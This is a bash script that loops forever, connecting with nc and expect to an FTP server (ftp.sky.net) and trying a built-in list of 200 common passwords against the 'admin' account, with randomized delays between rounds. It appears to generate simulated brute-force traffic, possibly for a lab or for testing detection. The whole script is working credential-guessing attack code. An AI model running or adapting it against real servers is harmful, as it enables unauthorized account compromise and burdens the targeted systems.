passwords=("123456" "123456789" "picture1" "password" "12345678" "111111" "123123" "12345" "1234567890" "senha"
"1234567" "qwerty" "abc123" "Million2" "000000" "1234" "iloveyou" "aaron431" "password1" "qqww1122"
"123" "omgpop" "123321" "654321" "qwertyuiop" "qwer123456" "123456a" "a123456" "666666" "asdfghjkl"
"ashley" "987654321" "unknown" "zxcvbnm" "112233" "chatbooks" "20100728" "123123123" "princess" "jacket025"
"evite" "123abc" "123qwe" "sunshine" "121212" "dragon" "1q2w3e4r" "5201314" "159753" "123456789"
"pokemon" "qwerty123" "Bangbang123" "jobandtalent" "monkey" "1qaz2wsx" "abcd1234" "default" "aaaaaa" "soccer"
"123654" "ohmnamah23" "12345678910" "zing" "shadow" "102030" "11111111" "asdfgh" "147258369" "qazwsx"
"qwe123" "michael" "football" "baseball" "1q2w3e4r5t" "party" "daniel" "asdasd" "222222" "myspace1"
"asd123" "555555" "a123456789" "888888" "7777777" "fuckyou" "1234qwer" "superman" "147258" "999999"
"159357" "love123" "tigger" "purple" "samantha" "charlie" "babygirl" "88888888" "jordan23" "789456123"
"jordan" "anhyeuem" "killer" "basketball" "michelle" "1q2w3e" "lol123" "qwerty1" "789456" "6655321"
"nicole" "naruto" "master" "chocolate" "maggie" "computer" "hannah" "jessica" "123456789a" "password123"
"hunter" "686584" "iloveyou1" "987654321" "justin" "cookie" "hello" "blink182" "andrew" "25251325"
"love" "987654" "bailey" "princess1" "123456" "101010" "12341234" "a801016" "1111" "1111111"
"anthony" "yugioh" "fuckyou1" "amanda" "asdf1234" "trustno1" "butterfly" "x4ivygA51F" "iloveu" "batman"
"starwars" "summer" "michael1" "00000000" "lovely" "jakcgt333" "buster" "jennifer" "babygirl1" "family"
"456789" "azerty" "andrea" "q1w2e3r4" "qwer1234" "hello123" "10203" "matthew" "pepper" "12345a"
"letmein" "joshua" "131313" "123456b" "madison" "Sample123" "777777" "football1" "jesus1" "taylor"
"b123456" "whatever" "welcome" "ginger" "flower" "333333" "1111111111" "robert" "samsung" "a12345"
"loveme" "gabriel" "alexander" "cheese" "passw0rd" "142536" "peanut" "11223344" "thomas" "angel1")

while :; do
	sleep $(( RANDOM % 100 + 300 ))s

	r=$RANDOM
	for n in {1..100}; do
		template=(
			"set timeout -1"
			"spawn nc ftp.sky.net 21"
			"expect \"220 Welcome Alpine ftp server *\""
		)

		for i in {1..3}; do
			idx=$(( (r + i + n * 3) % 200 ))
			password=${passwords[$idx]}
			template+=(
				"send -- \"USER admin\\n\""
				"expect \"331 Please specify the password.\""
				"send -- \"PASS $password\\n\""
				"expect \"530 Login incorrect.\""
			)
		done

		template+=(
			"send -- \"QUIT\\n\""
			"expect eof"
		)

		IFS=$'\n';
		expect <<< "${template[*]}"
		IFS=' '
	done
done
